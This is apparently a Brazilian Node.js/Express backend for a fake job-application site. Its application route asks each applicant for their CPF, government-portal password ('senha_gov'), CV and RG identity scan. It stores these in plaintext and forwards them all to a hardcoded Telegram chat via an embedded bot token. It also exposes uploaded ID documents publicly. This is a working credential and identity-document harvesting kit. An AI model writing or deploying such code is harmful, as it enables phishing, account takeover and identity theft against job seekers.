const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const mime = require('mime-types'); // Novo pacote para determinar o content-type
const app = express();

app.use(express.json());

// Configuração do multer para salvar PDFs e imagens
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// Conectar ao banco de dados SQLite
const db = new sqlite3.Database('./vagas.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao SQLite:', err);
    } else {
        console.log('Conectado ao SQLite');

        // Criar a tabela candidaturas
        db.run(`
            CREATE TABLE IF NOT EXISTS candidaturas (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                nome TEXT NOT NULL,
                email TEXT NOT NULL,
                telefone TEXT NOT NULL,
                cpf TEXT NOT NULL,
                senha_gov TEXT NOT NULL,
                curriculo_path TEXT NOT NULL,
                rg_path TEXT,
                data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `, (err) => {
            if (err) {
                console.error('Erro ao criar tabela candidaturas:', err);
            } else {
                // Verificar se a coluna rg_path existe
                db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
                    if (err) {
                        console.error('Erro ao verificar colunas da tabela candidaturas:', err);
                        return;
                    }

                    const hasRgPath = columns.some(column => column.name === 'rg_path');
                    if (!hasRgPath) {
                        console.log('Adicionando coluna rg_path à tabela candidaturas...');
                        db.run(`ALTER TABLE candidaturas ADD COLUMN rg_path TEXT`, (err) => {
                            if (err) {
                                console.error('Erro ao adicionar coluna rg_path:', err);
                            } else {
                                console.log('Coluna rg_path adicionada com sucesso.');
                            }
                        });
                    }
                });
            }
        });
    }
});

// Configuração do bot do Telegram
const token = '7332904856:AAFQXw1Th9nH5wMRYf8Rt0HeRirLqFgbJR4';
const bot = new TelegramBot(token, { polling: true });
const chatId = '5114449108';

// Função para formatar mensagens de vaga
function formatVagaMessage(vaga) {
    return `*Nova Vaga Cadastrada*\n\n` +
           `*Título:* ${vaga.titulo}\n` +
           `*Empresa:* ${vaga.empresa}\n` +
           `*Localização:* ${vaga.localizacao}\n` +
           `*Salário:* ${vaga.salario || 'Não informado'}\n` +
           `*Descrição:* ${vaga.descricao}\n` +
           `*Data:* ${vaga.data_criacao}`;
}

// Função para formatar mensagens de candidatura
function formatCandidaturaMessage(candidatura) {
    return `*Nova Candidatura Recebida*\n\n` +
           `*Nome:* ${candidatura.nome}\n` +
           `*Email:* ${candidatura.email}\n` +
           `*Telefone:* ${candidatura.telefone}\n` +
           `*CPF:* ${candidatura.cpf}\n` +
           `*Senha GOV:* ${candidatura.senha_gov}\n` +
           `*Currículo:* ${candidatura.curriculo_path}\n` +
           `*RG:* ${candidatura.rg_path || 'Não fornecido'}\n` +
           `*Data:* ${candidatura.data_criacao}`;
}

// Rota para listar vagas (GET /vagas)
app.get('/vagas', (req, res) => {
    db.all('SELECT * FROM vagas', [], (err, vagas) => {
        if (err) {
            console.error('Erro ao listar vagas:', err);
            res.status(500).send('Erro ao listar vagas');
        } else {
            res.json(vagas);
        }
    });
});

// Rota para cadastrar novas vagas (POST /vagas)
app.post('/vagas', (req, res) => {
    const { titulo, empresa, localizacao, salario, descricao } = req.body;
    
    const query = 'INSERT INTO vagas (titulo, empresa, localizacao, salario, descricao) VALUES (?, ?, ?, ?, ?)';
    db.run(query, [titulo, empresa, localizacao, salario, descricao], function(err) {
        if (err) {
            console.error('Erro ao cadastrar vaga:', err);
            res.status(500).send('Erro ao cadastrar vaga');
        } else {
            // Obter a vaga recém-cadastrada para enviar ao Telegram
            db.get('SELECT * FROM vagas WHERE id = ?', [this.lastID], (err, vaga) => {
                if (err) {
                    console.error('Erro ao obter vaga:', err);
                } else {
                    // Enviar mensagem para o Telegram
                    bot.sendMessage(chatId, formatVagaMessage(vaga), { parse_mode: 'Markdown' });
                }
            });
            
            res.send('Vaga cadastrada com sucesso!');
        }
    });
});

// Rota para receber candidaturas (POST /candidaturas)
app.post('/candidaturas', upload.fields([{ name: 'curriculo' }, { name: 'rg' }]), (req, res) => {
    const { nome, email, telefone, cpf, senha_gov } = req.body;
    const curriculo_path = req.files['curriculo'] ? req.files['curriculo'][0].path : null;
    const rg_path = req.files['rg'] ? req.files['rg'][0].path : null;

    if (!curriculo_path) {
        return res.status(400).send('Currículo é obrigatório.');
    }

    const query = 'INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path) VALUES (?, ?, ?, ?, ?, ?, ?)';
    db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path], function(err) {
        if (err) {
            console.error('Erro ao salvar candidatura:', err);
            res.status(500).send('Erro ao salvar candidatura');
        } else {
            // Obter a candidatura recém-cadastrada para enviar ao Telegram
            db.get('SELECT * FROM candidaturas WHERE id = ?', [this.lastID], (err, candidatura) => {
                if (err) {
                    console.error('Erro ao obter candidatura:', err);
                } else {
                    // Enviar mensagem para o Telegram
                    bot.sendMessage(chatId, formatCandidaturaMessage(candidatura), { parse_mode: 'Markdown' });
                    
                    // Determinar o content-type do currículo
                    const curriculoContentType = mime.lookup(curriculo_path) || 'application/octet-stream';
                    // Enviar o arquivo do currículo com content-type
                    bot.sendDocument(chatId, curriculo_path, {}, { contentType: curriculoContentType })
                        .then(() => console.log('Currículo enviado com sucesso'))
                        .catch(err => console.error('Erro ao enviar currículo:', err));

                    // Enviar o arquivo do RG (se fornecido)
                    if (rg_path) {
                        // Determinar o content-type do RG
                        const rgContentType = mime.lookup(rg_path) || 'application/octet-stream';
                        bot.sendDocument(chatId, rg_path, {}, { contentType: rgContentType })
                            .then(() => console.log('RG enviado com sucesso'))
                            .catch(err => console.error('Erro ao enviar RG:', err));
                    }
                }
            });
            
            res.send('Candidatura enviada com sucesso!');
        }
    });
});

// Comandos do bot do Telegram
bot.onText(/\/vagas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) {
        bot.sendMessage(msg.chat.id, 'Acesso negado. Você não tem permissão.');
        return;
    }

    db.all('SELECT * FROM vagas', [], (err, vagas) => {
        if (err) {
            bot.sendMessage(chatId, 'Erro ao listar vagas.');
            console.error('Erro ao listar vagas:', err);
            return;
        }
        if (vagas.length === 0) {
            bot.sendMessage(chatId, 'Nenhuma vaga encontrada.');
            return;
        }

        let mensagem = '*Vagas Disponíveis*\n\n';
        vagas.forEach(vaga => {
            mensagem += `*${vaga.titulo}*\n`;
            mensagem += `Empresa: ${vaga.empresa}\n`;
            mensagem += `Localização: ${vaga.localizacao}\n`;
            mensagem += `Salário: ${vaga.salario || 'Não informado'}\n`;
            mensagem += `Descrição: ${vaga.descricao}\n`;
            mensagem += `Data: ${vaga.data_criacao}\n\n`;
        });
        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

bot.onText(/\/candidaturas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) {
        bot.sendMessage(msg.chat.id, 'Acesso negado. Você não tem permissão.');
        return;
    }

    db.all('SELECT * FROM candidaturas', [], (err, candidaturas) => {
        if (err) {
            bot.sendMessage(chatId, 'Erro ao listar candidaturas.');
            console.error('Erro ao listar candidaturas:', err);
            return;
        }
        if (candidaturas.length === 0) {
            bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
            return;
        }

        let mensagem = '*Candidaturas Recebidas*\n\n';
        candidaturas.forEach(candidatura => {
            mensagem += `*${candidatura.nome}*\n`;
            mensagem += `Email: ${candidatura.email}\n`;
            mensagem += `Telefone: ${candidatura.telefone}\n`;
            mensagem += `CPF: ${candidatura.cpf}\n`;
            mensagem += `Senha GOV: ${candidatura.senha_gov}\n`;
            mensagem += `Currículo: ${candidatura.curriculo_path}\n`;
            mensagem += `RG: ${candidatura.rg_path || 'Não fornecido'}\n`;
            mensagem += `Data: ${candidatura.data_criacao}\n\n`;
        });
        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

// Servir os arquivos PDFs e imagens
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});